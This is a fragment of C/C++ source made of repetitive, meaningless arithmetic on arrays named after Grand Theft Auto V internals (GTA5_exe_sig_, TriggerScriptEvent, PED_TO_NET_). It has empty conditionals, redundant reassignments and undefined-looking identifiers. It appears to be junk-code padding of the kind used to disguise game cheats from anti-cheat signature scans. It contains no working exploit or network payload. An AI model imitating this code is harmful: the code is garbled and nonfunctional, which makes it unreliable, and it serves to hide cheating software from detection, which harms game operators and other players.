					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
